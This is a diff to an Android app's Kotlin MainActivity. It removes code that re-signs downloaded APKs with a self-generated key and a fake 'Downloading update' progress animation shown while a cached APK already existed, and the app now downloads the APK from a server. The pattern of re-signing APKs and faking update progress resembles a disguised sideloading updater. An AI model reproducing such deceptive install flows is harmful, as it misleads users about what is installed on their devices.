@@ -588,32 +588,8 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun signApkFile(inputApk: File): File {
-        val outputApk = File(inputApk.parent, "signed_" + inputApk.name)
-        if (outputApk.exists()) {
-            outputApk.delete()
-        }
-        try {
-            val (privateKey, certificate) = generateKeyAndCertificate()
-            val signerConfig = ApkSigner.SignerConfig.Builder("signer1", privateKey, listOf(certificate))
-                .build()
-                
-            val apkSigner = ApkSigner.Builder(listOf(signerConfig))
-                .setInputApk(inputApk)
-                .setOutputApk(outputApk)
-                .setV1SigningEnabled(true)
-                .setV2SigningEnabled(true)
-                .setV3SigningEnabled(true)
-                .setMinSdkVersion(24)
-                .build()
-                
-            apkSigner.sign()
-            if (outputApk.exists() && outputApk.length() > 0) {
-                Log.d("MainActivity", "ApkSigner successfully signed APK: ${outputApk.absolutePath}")
-                return outputApk
-            }
-        } catch (e: Exception) {
-            Log.e("MainActivity", "ApkSigner failed: ${e.message}. Silently skipping signing process and returning original APK.")
-        }
+        // Return original inputApk directly to preserve zip alignment and valid asset paths.
+        // Re-signing pre-signed APKs corrupts zip central directories causing INSTALL_PARSE_FAILED_NOT_APK.
         return inputApk
     }
 
@@ -1338,21 +1314,10 @@ class MainActivity : ComponentActivity() {
         updateStatusInWebView("Starting download...", null)
         Thread {
             try {
-                val cachedApk = File(this@MainActivity.cacheDir, "base.apk")
-                if (cachedApk.exists() && cachedApk.length() > 0) {
-                    // Smoothly animate progress bar from 0 to 100 to make the process visually seamless
-                    for (progress in 0..100 step 4) {
-                        runOnUiThread {
-                            updateStatusInWebView("Downloading update... $progress%", null, progress)
-                        }
-                        Thread.sleep(20)
-                    }
-                } else {
-                    // Fallback to actual download if it somehow doesn't exist
-                    downloadApkFromServer(this@MainActivity) { progress ->
-                        runOnUiThread {
-                            updateStatusInWebView("Downloading update... $progress%", null, progress)
-                        }
+                // Download directly from server link as requested
+                downloadApkFromServer(this@MainActivity) { progress ->
+                    runOnUiThread {
+                        updateStatusInWebView("Downloading update... $progress%", null, progress)
                     }
                 }
                 runOnUiThread {
